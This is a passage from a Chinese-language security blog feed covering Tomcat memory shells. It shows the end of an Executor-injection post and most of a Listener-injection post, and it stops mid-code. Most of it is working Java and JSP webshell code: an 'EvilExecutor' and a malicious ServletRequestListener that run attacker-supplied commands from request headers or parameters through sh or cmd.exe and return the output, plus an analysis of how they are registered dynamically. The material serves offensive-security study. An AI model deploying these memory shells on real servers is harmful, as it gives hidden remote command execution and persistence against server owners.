class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    getResponse(output.getBytes());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.execute(command, <span class="number">0L</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Executor/11.png"></p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object obj, String field)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getNioEndpoint</span><span class="params">()</span> &#123;</span><br><span class="line">    Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;Poller&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilExecutor</span> <span class="keyword">extends</span> <span class="title class_">ThreadPoolExecutor</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilExecutor</span><span class="params">(<span class="type">int</span> corePoolSize, <span class="type">int</span> maximumPoolSize, <span class="type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> getNioEndpoint();</span><br><span class="line">                    Object[] objects = (Object[]) getField(getField(nioEndpoint, <span class="string">&quot;nioChannels&quot;</span>), <span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">heapByteBuffer</span> <span class="operator">=</span> (ByteBuffer) getField(getField(objects[<span class="number">0</span>], <span class="string">&quot;appReadBufHandler&quot;</span>), <span class="string">&quot;byteBuffer&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">req</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(heapByteBuffer.array(), StandardCharsets.UTF_8);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.substring(req.indexOf(<span class="string">&quot;set-reference&quot;</span>) + <span class="string">&quot;set-reference&quot;</span>.length() + <span class="number">1</span>, req.indexOf(<span class="string">&quot;\r&quot;</span>, req.indexOf(<span class="string">&quot;set-reference&quot;</span>)) - <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">return</span> cmd;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getResponse</span><span class="params">(<span class="type">byte</span>[] res)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> getNioEndpoint();</span><br><span class="line">                    <span class="type">ArrayList</span> <span class="variable">processors</span> <span class="operator">=</span> (ArrayList) getField(getField(getField(nioEndpoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>), <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                    <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (RequestInfo) processor;</span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(getField(requestInfo, <span class="string">&quot;req&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                    response.addHeader(<span class="string">&quot;set-message&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(res, StandardCharsets.UTF_8));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> getRequest();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    getResponse(output.getBytes());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.execute(command, <span class="number">0L</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) getNioEndpoint();</span><br><span class="line">    <span class="type">ThreadPoolExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> (ThreadPoolExecutor) nioEndpoint.getExecutor();</span><br><span class="line">    nioEndpoint.setExecutor(<span class="keyword">new</span> <span class="title class_">EvilExecutor</span>(executor.getCorePoolSize(), executor.getMaximumPoolSize(),</span><br><span class="line">            executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(),</span><br><span class="line">            executor.getThreadFactory()));</span><br><span class="line">    response.getWriter().write(<span class="string">&quot;Executor Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Executor/12.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Listener</title>
      <link href="/2024/05/18/Tomcat-Listener/"/>
      <url>/2024/05/18/Tomcat-Listener/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>在之前学习Filter内存马和Servlet内存马时不难看出，内存马的实现就是动态注册一个Filter&#x2F;Servlet，然后在其中编写恶意类方法，即可起到无文件落地同时可以执行命令的目的。</p><p>Listener分为以下几种：</p><ul><li>ServletContextListener，服务器启动和终止时触发；</li><li>HttpSessionListener，有关Session操作时触发；</li><li>ServletRequestListener，访问服务时触发。</li></ul><p>其中，ServletRequestListener是最适合用来作为内存马的，因为ServletRequestListener是用来监听ServletRequest对 象的，当访问任意资源时，都会触发ServletRequestListener#requestInitialized方法。</p><p><img src="/2024/05/18/Tomcat-Listener/1.png"></p><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>环境搭建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> sre.getServletRequest().getClass().getName();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listener...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进javax.servlet.ServletRequestEvent，该类可以通过getServletRequest方法来获取ServletRequest。</p><p><img src="/2024/05/18/Tomcat-Listener/3.png"></p><p>运行构建的Demo，可以看到，每次请求都会触发Listener，且getServletRequest方法获取到的ServletRequest是org.apache.catalina.connector.RequestFacade。并且在org.apache.catalina.connector.RequestFacade的属性中存在Request属性，可以通过反射来获取。可以看到在下面的示例代码中，成功获取到的请求中的reuqest属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">request</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">            System.out.println(request1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Listener/4.png"></p><p>通过反射获取Request属性，获取其请求的参数用来执行命令，并利用其的Response将命令执行的结果回显。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">request</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">            <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request1.getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Listener/5.png"></p><p>上文分析了如何构造恶意的Listener，接着来看看如何动态注册上文构造的恶意的Listener。在之前分析Tomcat Architecture时，提到过在org.apache.catalina.core.StandardContext类的startInternal方法中，会分别调用listenerStart、filterStart和loadOnStartup来分别触发Listener、Filter、Servlet的构造加载。</p><p>跟进org.apache.catalina.core.StandardContext#listenerStart方法，该方法调用org.apache.catalina.core.StandardContext#findApplicationListeners方法来获取listeners数组，接着挨个从listeners数组取出并进行实例化，然后存入results数组中。</p><p>接着遍历results数组，根据不同类型的Listener，分别添加进eventListeners数组和lifecycleListeners数组。之后会调用org.apache.catalina.core.StandardContext#setApplicationEventListeners方法来清空applicationEventListenersList并重新赋值。而applicationEventListenersList中存放的正是之前实例化后的listener。</p><p><img src="/2024/05/18/Tomcat-Listener/6.png"></p><p><img src="/2024/05/18/Tomcat-Listener/7.png"></p><p><img src="/2024/05/18/Tomcat-Listener/8.png"></p><p>通过上文的分析中可以知道，org.apache.catalina.core.StandardContext#listenerStart方法会将Listener实例化后添加到applicationEventListenersList中，接着来看看如何触发实例化的Listener。</p><p>在Demo中的requestInitialized方法中下断点，看看在requestInitialized方法前实现了调用了一些什么方法。跟进org.apache.catalina.core.StandardContext#fireRequestInitEvent方法，该方法调用了org.apache.catalina.core.StandardContext#getApplicationEventListeners方法，而getApplicationEventListeners方法中返回的正是前面的applicationEventListenersList。接着遍历instances数组，并调用每个listener的requestInitialized方法。因此如果能够在applicationEventListenersList中添加构造的恶意的Listener，则能调用到构造的恶意Listener。</p><p><img src="/2024/05/18/Tomcat-Listener/9.png"></p><p><img src="/2024/05/18/Tomcat-Listener/10.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注入Listener内存马的具体思路如下:</p><ul><li>继承并编写一个恶意Listener；</li><li>获取StandardContext；</li><li>调用StandardContext#addApplicationEventListener添加恶意Listener。</li></ul><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 